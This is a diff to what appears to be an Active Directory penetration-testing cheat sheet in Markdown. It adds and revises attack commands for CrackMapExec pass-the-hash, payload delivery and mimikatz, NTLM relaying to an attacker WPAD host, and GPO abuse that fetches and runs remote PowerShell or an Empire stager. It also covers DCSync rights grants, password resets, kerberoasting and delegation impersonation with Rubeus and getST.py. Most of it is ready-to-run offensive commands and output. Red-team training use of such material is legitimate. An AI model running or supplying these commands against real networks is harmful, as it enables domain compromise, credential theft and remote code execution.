@@ -46,9 +46,13 @@
       - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
+      - [GenericAll](#genericall)
+      - [GenericWrite](#genericwrite)
+      - [WriteDACL](#writedacl)
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
     - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
+    - [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
     - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
     - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
     - [PrivExchange attack](#privexchange-attack)
@@ -70,36 +74,50 @@
 * [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 
   ```powershell
-  apt install bloodhound #kali
-  neo4j console
+  # start BloodHound and the database
+  root@payload$ apt install bloodhound #kali
+  root@payload$ neo4j console
+  root@payload$ ./bloodhound
   Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
-  ./bloodhound
-  SharpHound.exe (from resources/Ingestor)
-  SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
-  SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
-  or 
+  
+  # run the ingestor on the machine using SharpHound.exe
+  # https://github.com/BloodHoundAD/SharpHound3
+  .\SharpHound.exe (from resources/Ingestor)
+  .\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
+  .\SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
+  .\SharpHound.exe -c all -d active.htb -SearchForest
+  .\SharpHound.exe --EncryptZip --ZipFilename export.zip
+  .\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
+
+  # or run the ingestor on the machine using Powershell
+  # https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors
   Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
-  or 
+  Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
+
+  # or remotely via BloodHound Python
+  # https://github.com/fox-it/BloodHound.py
   bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
   ```
 
 * [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 
-  ```bash
-  apt-get install -y libssl-dev libffi-dev python-dev build-essential
-  git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
-  crackmapexec smb -L
-  crackmapexec smb -M name_module -o VAR=DATA
-  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
-  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
-  crackmapexec 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
-  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
-  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
-  crackmapexec 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
-  crackmapexec 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
-  crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
-  crackmapexec mimikatz --server http --server-port 80
+  ```powershell
+  # use the latest release, CME is now a binary packaged will all its dependencies
+  root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip
+
+  # execute cme (smb, winrm, mssql, ...)
+  root@payload$ cme smb -L
+  root@payload$ cme smb -M name_module -o VAR=DATA
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
+  root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
+  root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
+  root@payload$ cme mimikatz --server http --server-port 80
   ```
 
 * [Mitm6](https://github.com/fox-it/mitm6.git)
@@ -112,6 +130,7 @@
   # -wh: Server hosting WPAD file (Attacker’s IP)
   # -t: Target (You cannot relay credentials to the same device that you’re spoofing)
   # -i: open an interactive shell
+  ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
   ```
 
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
@@ -387,7 +406,14 @@ Get-NetGPOGroup
 
 ### Exploit Group Policy Objects GPO
 
+> Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
+
 ```powershell
+# Build and configure SharpGPOAbuse
+git clone https://github.com/FSecureLABS/SharpGPOAbuse
+Install-Package CommandLineParser -Version 1.9.3.15
+ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll
+
 # Adding User Rights
 SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
 
@@ -399,6 +425,16 @@ SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContent
 
 # Configuring a Computer or User Immediate Task
 SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+```
+
+Abuse GPO with PowerView
+
+```powershell
+# Enumerate GPO
+Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
+
+# New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO
+New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
 ```
 
 
@@ -486,9 +522,12 @@ secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
 secretsdump also works remotely
 
 ```java
-./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss
+./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-status 
 ./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
 ```
+
+* `-pwd-last-set`: Shows pwdLastSet attribute for each NTDS.DIT account.
+* `-user-status`: Display whether or not the user is disabled.
 
 #### Alternatives - modules
 
@@ -540,7 +579,7 @@ Password spraying refers to the attack method that takes a large number of usern
 
 Most of the time the best passwords to spray are :
 
-- Password123, mimikatz
+- P@ssw0rd01, Password123, mimikatz
 - Welcome1/Welcome01
 - $Companyname1 : $Microsoft1
 - SeasonYear : Winter2019*,Spring2020!,Summer2018? 
@@ -764,6 +803,13 @@ C:\Rubeus> john --wordlist=passwords_kerb.txt hashes.asreproast
 Using `impacket` to get the hash and `hashcat` to crack it.
 
 ```powershell
+# example
+$ python GetNPUsers.py htb.local/svc-alfresco -no-pass
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7ae561334cd58a56af90f7fbb20bbd4493b6754a57d5ebc08cb7f47ea472ebb7c9ba4260f57c11b664be03191550254e5c77a17518aeabc55f9321bd9f52201df820e130aa0e3f4b0986725fd3a14794433881050eb62d384c4058a407a348a7de2ef0767a99c9df4f85d8eba8ce30a4ad59621c51f8ea8c0d33f33e06bea1d8ff28d7a86fc2010fd7fa45d2fcc2178cb13c1006823aec8a5da10cffcceeb6e978754b0d4976df5cccb4beb9776d5a8f4810153ccc0e1237ec74e6ae61402457c6cfe29bca7c2f62b287f13aff063f5a0a21c728581e43b46d7537b3e776b4
+
 # extract hashes
 root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
@@ -936,9 +982,9 @@ cme smb $hosts --gen-relay-list relay.txt
 mitm6 -i eth0 -d $domain
 
 # spoofing WPAD and relaying NTLM credentials
-http://ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relay.txt
+ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relay.txt
 or 
-http://ntlmrelayx.py -6 -wh $attacker_ip -l /tmp -socks -debug
+ntlmrelayx.py -6 -wh $attacker_ip -l /tmp -socks -debug
 ```
 
 #### Drop the MIC
@@ -1012,22 +1058,57 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccount
 
 ### Abusing Active Directory ACLs/ACEs
 
-* **GenericAll on User** : We can reset user's password without knowing the current password
-* **GenericAll on Group** : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : `net group "domain admins" spotless /add /domain`
-* **WriteProperty on Group** : We can again add ourselves to the Domain Admins group and escalate privileges: `net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain`
-* **Self (Self-Membership) on Group** : Another privilege that enables the attacker adding themselves to a group
-* **ForceChangePassword** : we can reset the user's password without knowing their current password: `$c = Get-Credential;Set-DomainUserPassword -Identity changeme -AccountPassword $c.Password -Verbose` 
-* **GenericWrite on User** : WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
-* **WriteDACL** : It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'`
-    ```powershell
-    # give DCSync right to titi
-    Add-ObjectACL -TargetDistinguishedName "dc=dev,dc=testlab,dc=local" -PrincipalSamAccountName titi -Rights DCSync
-    ```
-
 Check ACL for an User with [ADACLScanner](https://github.com/canix1/ADACLScanner).
 
 ```powershell
 ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show
+```
+
+#### GenericAll
+
+* **GenericAll on User** : We can reset user's password without knowing the current password
+* **GenericAll on Group** : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : `net group "domain admins" spotless /add /domain`
+
+GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its hash and kerberoast it.
+
+```powershell
+# using PowerView
+# Check for interesting permissions on accounts:
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
+ 
+# Check if current user has already an SPN setted:
+Get-DomainUser -Identity <UserName> | select serviceprincipalname
+ 
+# Force set the SPN on the account:
+Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
+```
+
+#### GenericWrite
+
+* Reset another user's password
+
+    ```powershell
+    # https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
+    $user = 'DOMAIN\user1'; 
+    $pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; 
+    $creds = New-Object System.Management.Automation.PSCredential $user, $pass;
+    $newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; 
+    Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
+    ```
+
+* WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
+
+
+#### WriteDACL
+
+To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'`
+
+```powershell
+# Give DCSync right to the principal identity
+Import-Module .\PowerView.ps1
+$SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
 ```
 
 
@@ -1083,6 +1164,9 @@ Prerequisite:
     ```powershell
     $ Convert-NameToSid target.domain.com\krbtgt
     S-1-5-21-2941561648-383941485-1389968811-502
+
+    # with Impacket
+    lookupsid.py domain/user:password@10.10.10.10
     ```
 - Replace 502 with 519 to represent Enterprise Admins
 - Create golden ticket and attack parent domain. 
@@ -1092,7 +1176,9 @@ Prerequisite:
 
 ### Kerberos Unconstrained Delegation
 
-> The user sends a TGS to access the service, along with their TGT, and then the service can use the user’s TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
+> The user sends a TGS to access the service, along with their TGT, and then the service can use the user's TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html 
+
+:warning: Unconstrained delegation used to be the only option available in Windows 2000
 
 Domain Compromise via DC Print Server and Unconstrained Delegation
 
@@ -1156,6 +1242,36 @@ Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HA
 
 * Ensure sensitive accounts cannot be delegated
 * Disable the Print Spooler Service
+
+### Kerberos Constrained Delegation
+
+> Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however,
+
+Passing the -impersonate flag and specifying the user we wish to impersonate (any valid username).
+
+```powershell
+# Discover
+$ Get-DomainComputer -TrustedToAuth | select -exp dnshostname
+
+# Find the service 
+$ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
+
+# Exploit with Impacket
+$ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+# Exploit with Rubeus
+$ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
+$ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /ptt
+$ dir \\dc.domain.com\c$
+```
+
 
 ### Kerberos Resource Based Constrained Delegation
 
@@ -1524,3 +1640,8 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 * [A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)
 * [Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf](https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0)
+* [Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+* [Active-Directory-Exploitation-Cheat-Sheet - @buftas](https://github.com/buftas/Active-Directory-Exploitation-Cheat-Sheet#local-privilege-escalation)
+* [GPO Abuse - Part 1 - RastaMouse - 6 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
+* [GPO Abuse - Part 2 - RastaMouse - 13 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-2/)
+* [Abusing GPO Permissions - harmj0y - March 17, 2016](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
